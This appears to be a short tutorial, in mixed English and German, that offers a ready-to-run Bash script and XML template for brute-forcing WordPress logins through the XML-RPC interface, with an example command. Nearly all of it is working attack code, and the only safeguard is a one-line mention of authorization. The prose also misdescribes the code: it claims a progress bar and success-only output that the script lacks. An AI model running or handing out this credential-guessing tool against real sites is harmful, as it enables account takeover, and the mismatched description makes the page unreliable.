# XML-RPC automated costs

The shell script we developed is designed to test username and password combinations against a WordPress site via its XML-RPC interface. It accepts four parameters: the WordPress XML-RPC URL, a file with usernames, another with passwords, and an XML request template. The script iterates through each username and password pair, injecting them into the request template and sending the modified XML-RPC request to the specified URL. It incorporates a progress bar to visually indicate the completion status. The script reports back only when a successful login is achieved. This tool is useful for security testing, assuming proper authorization and ethical usage.



You should create an XML template file with a placeholder where the password will be inserted. Let's name this file `request_template.xml` and it should look like this:



```
// xml code
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
       <param><value>§username§</value></param>
       <param><value>§password§</value></param>
    </params>
</methodCall>
```

```
// Bash code

#!/bin/bash

# Prüfen, ob genügend Argumente übergeben wurden
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 [XML-RPC URL] [Username File] [Password File] [Request Template File]"
    exit 1
fi

# Zuweisen der Argumente zu Variablen
URL="$1"
USERNAME_FILE="$2"
PASSWORD_FILE="$3"
REQUEST_TEMPLATE_FILE="$4"

# Prüfen, ob die Benutzername- und Passwort-Dateien existieren
if [ ! -f "$USERNAME_FILE" ]; then
    echo "Username file not found: $USERNAME_FILE"
    exit 1
fi

if [ ! -f "$PASSWORD_FILE" ]; then
    echo "Password file not found: $PASSWORD_FILE"
    exit 1
fi

if [ ! -f "$REQUEST_TEMPLATE_FILE" ]; then
    echo "Request template file not found: $REQUEST_TEMPLATE_FILE"
    exit 1
fi

# Jeden Benutzernamen durchgehen
while read -r username; do
    # Jedes Passwort durchgehen
    while read -r password; do
        # Ersetzen der Platzhalter im XML-Template
        xml_request=$(sed "s/§username§/$username/" $REQUEST_TEMPLATE_FILE | sed "s/§password§/$password/")

        # Senden der Anfrage und Speichern der Antwort
        response=$(curl --silent --data "$xml_request" $URL)

        # Prüfen, ob die Antwort auf ein falsches Passwort hinweist
        if echo "$response" | grep -q "<string>Incorrect username or password.</string>"; then
            echo "Failed with username: $username and password: $password"
        else
            echo "Success with username: $username and password: $password"
            # Optional: Hier könnten Sie eine Pause einlegen oder das Skript beenden, wenn ein Erfolg erzielt wird
        fi

        # Optional: Pause zwischen den Anfragen
      #  sleep 2
    done < "$PASSWORD_FILE"
done < "$USERNAME_FILE"

```

```
// execute
./script.sh http://yourwordpresssite.com/xmlrpc.php usernames.txt passwords.txt request_template.xml

```

Um dieses Skript auszuführen, geben Sie die URL, den Pfad zur Datei mit Benutzernamen, den Pfad zur Passwortdatei und den Pfad zur XML-Vorlagendatei an. Zum Beispiel:
